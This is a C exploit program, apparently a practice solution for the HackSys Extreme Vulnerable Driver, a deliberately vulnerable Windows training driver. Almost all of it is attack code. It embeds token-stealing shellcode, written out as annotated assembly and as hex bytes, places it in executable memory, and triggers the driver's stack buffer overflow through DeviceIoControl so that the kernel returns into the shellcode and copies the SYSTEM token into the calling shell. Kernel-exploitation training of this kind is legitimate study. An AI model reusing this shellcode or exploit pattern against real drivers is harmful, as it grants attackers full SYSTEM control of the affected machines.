#include <Windows.h>
#include <stdio.h>
#include "hevd.hpp"

HANDLE openDevice() {
    return CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
}

void closeDevice(HANDLE device) {
    CloseHandle(device);
}

int main()
{
    puts("Hello World!");
    HANDLE device = openDevice();
    if (device == INVALID_HANDLE_VALUE) {
        puts("Failed to open");
        return 1;
    }
    DWORD inputSize = 0x820;
    unsigned long long* input = (unsigned long long*)VirtualAlloc(NULL, inputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Create ret2user code buf
    // Get current thread: https://amriunix.com/posts/windows-kernel-shellcode-tokenstealer/ ==> gs:[0x188]
    // Shellcode also saved in shellcode.asm
    /*
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi

        mov rax, gs:[0x188]			; Find current _KTHREAD
        mov rax,  [rax +0x210]		; Find current _KPROCESS/_EPROCESS
        mov rbx,  [rax + 0x290]		; Find parent PID (cmd.exe or powershell.exe)

        find_cmd_proc:
        mov rax, [rax + 0x188]		; ActiveProcessLinks.Flink
        sub rax, 0x188				; Next EPROCESS
        cmp rbx, [rax + 0x180]		; Check _EPROCESS.UniqueProcessId with target PID
        jnz find_cmd_proc

        mov rcx, rax				; Save target process
        mov rbx, 4					; 4 is PID of SYSTEM

        find_system_proc:			; Same shit as 1st loop
        mov rax, [rax + 0x188]		; ActiveProcessLinks.Flink
        sub rax, 0x188				; Next EPROCESS
        cmp rbx, [rax + 0x180]		; Check _EPROCESS.UniqueProcessId with target PID
        jnz find_system_proc

        mov rdx, [rax + 0x208]		; Copy token value
        mov [rcx + 0x208], rdx

        pop rax
        pop rbx
        pop rcx
        pop rdx
        pop rsi
        pop rdi

        add rsp, 0x28
        ret
*/
    const char shellcode[] = "\x50\x53\x51\x52\x56\x57\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\x10\x02\x00\x00\x48\x8B\x98\x90\x02\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00\x48\x3B\x98\x80\x01\x00\x00\x75\xEA\x48\x89\xC1\x48\xC7\xC3\x04\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00\x48\x3B\x98\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00\x48\x89\x91\x08\x02\x00\x00\x58\x5B\x59\x5A\x5E\x5F\x48\x83\xC4\x28\xC3";
    char* shellcodeBuf = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeBuf, shellcode, sizeof(shellcode));

    // Payload to overwrite kernel eip
    memset(input, 0x41, inputSize - 8);
    input[259] = (long long)shellcodeBuf;

    DWORD sizeReturned;
    BOOL status = DeviceIoControl(device, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, input, inputSize, NULL, 0, NULL, NULL);
    if (!status) {
        puts("Failed to send");
        return 1;
    }
    // rbp is corrupted and not recovered by our shellcode
    // That's probably why the app crash (??)
    // The crash is in usermode though so I dont care
    puts("Done copying token");
    closeDevice(device);
    VirtualFree((LPVOID)input, 0, MEM_RELEASE);
    
}
